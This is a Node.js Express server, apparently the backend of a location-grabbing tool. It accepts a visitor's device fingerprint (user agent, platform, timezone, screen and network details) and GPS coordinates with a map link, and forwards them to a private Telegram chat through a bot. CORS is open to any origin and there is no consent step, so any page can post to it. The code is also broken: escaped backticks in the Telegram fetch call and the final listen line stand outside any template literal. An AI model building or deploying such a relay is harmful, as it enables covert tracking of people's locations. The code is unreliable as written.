import express from "express";
import fetch from "node-fetch";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
}

// --- Test page route ---
app.get("/", (req, res) => {
  res.send(`
    <html>
      <head>
        <title>Telegram Backend Test</title>
        <style>
          body { font-family: sans-serif; text-align: center; margin-top: 50px; }
          button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        </style>
      </head>
      <body>
        <h1>Telegram Location Backend</h1>
        <p>Click the button to send test data to Telegram.</p>
        <button onclick="sendTest()">Send Test Data</button>
        <p id="status"></p>
        <script>
          async function sendTest() {
            document.getElementById("status").innerText = "Sending...";
            const res = await fetch("/send-to-telegram", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userAgent: navigator.userAgent,
                browserName: "Chrome",
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                effectiveType: navigator.connection?.effectiveType || "unknown",
                downlink: navigator.connection?.downlink || 0,
                latitude: "14.5995",
                longitude: "120.9842",
                mapLink: "https://maps.google.com/?q=14.5995,120.9842"
              })
            });
            const data = await res.json();
            if (data.success) {
              document.getElementById("status").innerText = "✅ Sent successfully!";
            } else {
              document.getElementById("status").innerText = "❌ Error: " + data.error;
            }
          }
        </script>
      </body>
    </html>
  `);
});

// --- Telegram API route ---
app.post("/send-to-telegram", async (req, res) => {
  try {
    const {
      userAgent, browserName, platform, language, timezone,
      screenWidth, screenHeight, effectiveType, downlink,
      latitude, longitude, mapLink
    } = req.body;

    const message = `
📋 *Device Info:*
🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
🌐 *Browser:* ${escapeMarkdownV2(browserName)}
🖥️ *Platform:* ${escapeMarkdownV2(platform)}
🗣️ *Language:* ${escapeMarkdownV2(language)}
⏰ *Timezone:* ${escapeMarkdownV2(timezone)}
🖥️ *Screen:* ${escapeMarkdownV2(screenWidth + "x" + screenHeight)}
📡 *Network Type:* ${escapeMarkdownV2(effectiveType)}
📶 *Downlink Speed:* ${escapeMarkdownV2(downlink + " Mbps")}
🗺️ *Latitude:* ${escapeMarkdownV2(latitude)}
🗺️ *Longitude:* ${escapeMarkdownV2(longitude)}
🗺️ *Map:* ${escapeMarkdownV2(mapLink)}
🕒 *Timestamp:* ${escapeMarkdownV2(new Date().toLocaleString())}
`;

    const telegramRes = await fetch(
      \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "MarkdownV2"
        })
      }
    );

    if (telegramRes.ok) {
      res.json({ success: true });
    } else {
      const errorData = await telegramRes.json();
      res.status(500).json({ success: false, error: errorData.description });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(\`Server running on port \${PORT}\`));
